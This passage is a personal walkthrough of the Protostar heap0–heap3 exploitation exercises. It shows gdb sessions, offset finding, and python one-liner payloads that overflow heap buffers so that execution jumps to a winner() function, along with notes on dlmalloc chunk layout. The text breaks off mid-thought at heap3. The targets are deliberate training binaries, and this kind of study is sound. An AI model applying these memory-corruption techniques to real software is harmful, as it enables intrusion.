heap0:


(gdb) run Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A                                                                                                     
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /opt/protostar/bin/heap0 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
data is at 0x804a008, fp is at 0x804a050

Program received signal SIGSEGV, Segmentation fault.
0x41346341 in ?? ()
(gdb) p &winner
$1 = (void (*)(void)) 0x8048464 <winner>
(gdb) run $(python -c "print 'A'*72 + '\x08\x04\x84\x64'[::-1]")
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /opt/protostar/bin/heap0 $(python -c "print 'A'*72 + '\x08\x04\x84\x64'[::-1]")
data is at 0x804a008, fp is at 0x804a050
level passed

Program exited with code 015.


heap1:
(gdb) run Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A AAAA
Starting program: /opt/protostar/bin/heap1 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A AAAA

Program received signal SIGSEGV, Segmentation fault.
*__GI_strcpy (dest=0x37614136 <Address 0x37614136 out of bounds>, src=0xbffffe70 "AAAA") at strcpy.c:40
40	strcpy.c: No such file or directory.
	in strcpy.c


~/c/tools> ./pattern.py offset 0x37614136 300
Offset: 20

Okay, so offfset is 20, so since this program takes 2 arguments, we should be able to put some shellcode in the second and point the vtable to it

Lets get the address of the other argument in the heap
(gdb) run `python -c "print 'A'*20 + '\x12\x34\x56\x78'"` AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /opt/protostar/bin/heap1 `python -c "print 'A'*20 + '\x12\x34\x56\x78'"` AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Breakpoint 2, 0x08048538 in main (argc=3, argv=0xbffffcf4) at heap1/heap1.c:31
31	in heap1/heap1.c
(gdb) p &i2->name                                                                                  
$3 = (char **) 0xbffffcb4

(gdb) p &winner
$10 = (void (*)(void)) 0x8048494 <winner>


So it seems that we are overwriting the destination address of the second strcpy, so by specifying the address
of eip on the stack, we can get the program flow to pop the return address of winner() off the stack


(gdb) run `python -c "print 'A'*20 + '\xbf\xff\xfc\x9c'[::-1] + ' ' + '\x08\x04\x84\x94'[::-1]"`
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /opt/protostar/bin/heap1 `python -c "print 'A'*20 + '\xbf\xff\xfc\x9c'[::-1] + ' ' + '\x08\x04\x84\x94'[::-1]"`
and that's a wrap folks!
and we have a winner @ 1522958051

Program received signal SIGSEGV, Segmentation fault.
0x00000000 in ?? ()


user@protostar:/opt/protostar/bin$ ./heap1 `python -c "print 'A'*20 + '\xbf\xff\xfc\x9c'[::-1] + ' ' + '\x08\x04\x84\x94'[::-1]"`
and that's a wrap folks!

For some reason the address doesnt work outside of GDB and I'm not going to spend a bunch of time trying to figure out exactly why. #fuckenvironmentvariables


heap2:

MOAR heap stuff!

So, basically, you want to trick the binary into thinking there is something in the auth field in the auth struct. 
strcpy() == bad bad, although there is a strlen() check to make sure the value is within bounds.
So allocate an auth object, and a service object. They should be beside each other in heap.
Check the login and we aren't logged in. So reset, this free's the auth object.
Notice malloc(sizeof(auth)) isnt actually the size of the struct, just the 4 bytes of the pointer.
So we should be able to overflow from service into auth on the heap and set the auth.

user@protostar:/opt/protostar/bin$ ./heap2
[ auth = (nil), service = (nil) ]
auth AAAA
[ auth = 0x804c008, service = (nil) ]
service AAAA
[ auth = 0x804c008, service = 0x804c018 ]
login
please enter your password
[ auth = 0x804c008, service = 0x804c018 ]
reset
[ auth = 0x804c008, service = 0x804c018 ]
auth AAAA
[ auth = 0x804c008, service = 0x804c018 ]
service AAAA
[ auth = 0x804c008, service = 0x804c028 ]
login
you have logged in already!
[ auth = 0x804c008, service = 0x804c028 ]


heap3:
winner ptr: 0x8048864

The hints tells us that dlmalloc is being used.
dlmalloc structure in memory looks like (taken from doug lea's malloc implementation):
A chunk that's in use looks like:

   chunk-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
           | Size of previous chunk (if P = 0)                             |
           +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
         +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ |P|
         | Size of this chunk                                         1| +-+
   mem-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
         |                                                               |
         +-                                                             -+
         |                                                               |
         +-                                                             -+
         |                                                               :
         +-      size - sizeof(size_t) available payload bytes          -+
         :                                                               |
 chunk-> +-                                                             -+
         |                                                               |
         +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
       +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ |1|
       | Size of next chunk (may or may not be in use)               | +-+
 mem-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+

    And if it's free, it looks like this:

   chunk-> +-                                                             -+
           | User payload (must be in use, or we would have merged!)       |
           +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
         +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ |P|
         | Size of this chunk                                         0| +-+
   mem-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
         | Next pointer                                                  |
         +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
         | Prev pointer                                                  |
         +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
         |                                                               :
         +-      size - sizeof(struct chunk) unused bytes               -+
         :                                                               |
 chunk-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
         | Size of this chunk                                            |
         +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
       +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ |0|
       | Size of next chunk (must be in use, or we would have merged)| +-+
 mem-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
       |                                                               :
       +- User payload                                                -+
       :                                                               |
       +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
                                                                     |0|
                                                                     +-+

At the end, of the program, there are 3 calls to free(). The heap will look
something like this before calling the frees:

prev_size = 0
size_of = N
usable buffer = N bytes
size_of_next = M
...

Repeated 3 times based on what we pass to args 1,2,3

So how can we get
